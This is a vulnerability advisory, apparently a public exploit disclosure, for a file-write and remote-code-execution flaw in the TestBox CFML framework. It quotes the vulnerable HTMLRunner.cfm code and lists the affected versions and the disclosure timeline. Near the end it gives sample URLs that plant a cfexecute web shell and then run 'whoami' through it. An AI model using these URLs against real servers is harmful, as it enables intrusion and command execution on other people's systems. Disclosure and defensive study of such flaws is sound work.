@@ -1,0 +1,79 @@
+# Title: TestBox CFML Test Framework 4.1.0 - Arbitrary File Write and Remote Code Execution
+# Author: Darren King
+# Date: 2020-07-23
+# Vendor Homepage: https://www.ortussolutions.com/products/testbox
+# Software Link: https://www.ortussolutions.com/parent/download/testbox?version=3.1.0
+# Version : 2.4.0 through to 4.1.0
+# Tested on: Adobe ColdFusion 11, Adobe ColdFusion 2016, Adobe ColdFusion 2018, Coldbox-6.0.0-snapshot [2020-07-23] / Lucee 5.3.6.61  
+
+About TestBox
+------------------------
+TestBox is an open source testing framework for ColdFusion (CFML). It is written and maintained by Ortus Solutions, and can be
+downloaded/installed as a stand-alone package as well as being distributed as part of Ortus' ColdBox CFML MVC framework (https://www.coldbox.org/).
+
+TestBox is normally deployed in directories "/testbox" (or "/test") under the root of the corresponding ColdFusion/ColdBox application, 
+and allows users to run CFML unit tests and to generate reports.
+
+https://www.ortussolutions.com/products/testbox
+https://github.com/Ortus-Solutions/testbox
+
+As per the vendor, TestBox is meant for development & testing purposes only and should not be deployed to production environments.
+
+Command Injection & RCE
+------------------------
+The file testbox/system/runners/HTMLRunner.cfm is vulnerable to command injection and can be exploited to obtain remote code execution on the remote host.
+The block below shows the vulnerable code:
+
+HTMLRunner.cfm, lines 51-73:
+// Write TEST.properties in report destination path.
+if( url.propertiesSummary ){
+	testResult = testbox.getResult();
+	errors = testResult.getTotalFail() + testResult.getTotalError();
+	savecontent variable="propertiesReport"{
+		writeOutput( ( errors ? "test.failed=true" : "test.passed=true" ) & chr( 10 ) );
+		writeOutput( "test.labels=#arrayToList( testResult.getLabels() )#
+		test.bundles=#URL.bundles#
+		test.directory=#url.directory#
+		total.bundles=#testResult.getTotalBundles()#
+		total.suites=#testResult.getTotalSuites()#
+		total.specs=#testResult.getTotalSpecs()#
+		total.pass=#testResult.getTotalPass()#
+		total.fail=#testResult.getTotalFail()#
+		total.error=#testResult.getTotalError()#
+		total.skipped=#testResult.getTotalSkipped()#" );
+	}
+
+	//ACF Compatibility - check for and expand to absolute path
+	if( !directoryExists( url.reportpath ) ) url.reportpath = expandPath( url.reportpath );
+
+	fileWrite( url.reportpath & "/" & url.propertiesFilename, propertiesReport );
+}
+
+If the "propertiesSummary" query string parameter is specified, the CFM page will write a properties file to the specified path with a summary of the tests performed.
+The reportpath and propertiesFilename values are both supplied as query string parameters and are unvalidated, meaning that the user can supply an arbitrary filename and have the application output
+a CFM file (i.e. propertiesFilename=evil.cfm) within the path of the application. 
+The user can also specify the "labels" to apply to the test (via the "labels" query string parameter), which are included in the written properties file. Again, these labels are unvalidated and
+not sanitized, allowing arbitrary CFML tags and script to be passed to the code. When the properties are output to a CFM file (as per the propertiesFilename parameter), the written CFM
+can then be accessed via the browser and any corresponding CFML tags will be executed by the CFML server. 
+(Note that Adobe ColdFusion often runs as the System user on Windows, which means it might be possible to achieve remote code execution as System in these circumstances.)
+
+Sample URL to write local CFM file:
+http://<HOST>/testbox/system/runners/HTMLRunner.cfm?propertiesSummary=true&reportpath=../runners&propertiesFilename=exec.cfm&labels=<pre><cfexecute name="%23url.cmd%23" arguments="%23url.args%23" timeout="5"></cfexecute></pre>
+
+Sample URL to confirm:
+http://<HOST>/testbox/system/runners/exec.cfm?cmd=whoami&args=/all
+
+Versions Affected
+------------------------
+Versions affected (and platform tested on):
+  - Testbox-4.1.0+384-202005272329 (Adobe ColdFusion 2018, Adobe ColdFusion 2016, Coldbox-6.0.0-snapshot [2020-07-23] / Lucee 5.3.6.61)
+  - Testbox-3.1.0+339-201909272036 (Adobe ColdFusion 2018, Adobe ColdFusion 2016, Adobe ColdFusion 11)
+  - Testbox-3.0.0+309-201905040706 (Adobe ColdFusion 2018, Adobe ColdFusion 2016, Adobe ColdFusion 11)
+  - Testbox-2.5.0+107-201705171812 (Adobe ColdFusion 2018, Adobe ColdFusion 2016, Adobe ColdFusion 11)
+  - Testbox-2.4.0+80-201612030044  (Adobe ColdFusion 2018, Adobe ColdFusion 2016, Adobe ColdFusion 11)
+  
+Timeline
+------------------------
+2020-07-23 - Reserved CVEs
+2020-08-04 - Disclosed issues to vendor
+2020-08-04 - Response from vendor - not an issue. TestBox is a testing framework and is not meant to be deployed in production.
